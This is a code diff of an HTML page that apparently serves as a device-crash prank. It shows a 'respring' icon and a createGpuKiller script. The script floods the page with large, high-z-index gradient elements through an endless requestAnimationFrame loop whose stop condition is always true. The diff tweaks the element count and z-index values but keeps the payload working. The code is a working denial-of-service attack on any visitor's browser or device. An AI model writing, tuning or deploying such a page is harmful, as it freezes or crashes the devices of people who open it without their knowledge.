@@ -175,6 +175,7 @@
                 <span class="respring-icon">⟳</span>
             </div>
         </div>
+        
     </div>
 
     <script>
@@ -198,14 +199,14 @@
             let elementCount = 0;
             function createGpuKiller() {
                 try {
-                    for (let i = 0; i < 120; i++) {
+                    for (let i = 0; i < 60; i++) {
                         const element = document.createElement('div');
                         element.className = 'gpu-killer';
                         element.style.width = Math.random() * 400 + 100 + 'px';
                         element.style.height = element.style.width;
                         element.style.left = Math.random() * 100 + 'vw';
                         element.style.top = Math.random() * 100 + 'vh';
-                        element.style.zIndex = 2146483647 + elementCount;
+                        element.style.zIndex = 1000000 + elementCount;
                         element.style.background = `radial-gradient(circle, 
                             hsl(${Math.random() * 360}, 100%, 50%), 
                             hsl(${Math.random() * 360}, 100%, 50%), 
@@ -213,7 +214,7 @@
                         document.body.appendChild(element);
                         elementCount++;
                     }
-                    if (elementCount > -2147483647) {
+                    if (elementCount > -2146483647) {
                         requestAnimationFrame(createGpuKiller);
                     }
                 } catch(e) {
